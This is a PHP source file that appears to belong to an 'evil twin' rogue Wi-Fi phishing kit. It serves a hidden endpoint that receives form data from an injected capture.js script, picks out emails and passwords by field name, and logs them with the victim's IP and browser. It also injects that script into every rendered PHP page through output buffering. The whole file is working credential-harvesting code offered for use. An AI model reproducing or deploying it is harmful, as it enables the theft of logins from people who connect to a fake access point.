<?php
/**
 * capture_hook.php
 * Dual purpose:
 *   1. When called as /___capture — receives JSON from capture.js and logs it
 *   2. When auto_prepended to PHP templates — injects the capture.js script tag
 */

define('LOG_FILE', getenv('CAPTURE_LOG') ?: '/tmp/evil_twin_creds.log');

// ── Handle direct capture endpoint calls ─────────────────────────────────────
if ($_SERVER['REQUEST_URI'] === '/___capture' && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw  = file_get_contents('php://input');
    $data = json_decode($raw, true) ?: [];

    $fields   = $data['fields'] ?? [];
    $url      = $data['url']    ?? '';
    $ip       = $_SERVER['REMOTE_ADDR'] ?? '';
    $ua       = substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 120);
    $ts       = date('Y-m-d H:i:s');

    // Identify email/user and password from field names
    $email    = '';
    $password = '';
    foreach ($fields as $k => $v) {
        $kl = strtolower($k);
        if (!$email && preg_match('/email|user|login|identifier|name|phone|account/', $kl)) {
            $email = $v;
        }
        if (!$password && preg_match('/pass|pwd|secret|pin|token/', $kl)) {
            $password = $v;
        }
    }

    $entry = json_encode([
        'time'     => $ts,
        'ip'       => $ip,
        'email'    => $email,
        'password' => $password,
        'fields'   => $fields,
        'url'      => $url,
        'ua'       => $ua,
    ], JSON_UNESCAPED_UNICODE);

    $dir = dirname(LOG_FILE);
    if (!is_dir($dir)) mkdir($dir, 0755, true);
    file_put_contents(LOG_FILE, $entry . "\n", FILE_APPEND | LOCK_EX);

    error_log("[Portal] CAPTURED: $email / $password from $ip (url: $url)");

    header('Content-Type: application/json');
    echo '{"ok":true}';
    exit;
}

// ── Auto-prepend mode: inject capture.js into PHP template output ─────────────
// Uses output buffering to append the script tag before </body>
ob_start(function($buffer) {
    $script = '<script src="/___capture.js"></script>';
    // Inject before </body> if present, otherwise append
    if (stripos($buffer, '</body>') !== false) {
        $buffer = str_ireplace('</body>', $script . '</body>', $buffer);
    } else {
        $buffer .= $script;
    }
    return $buffer;
});
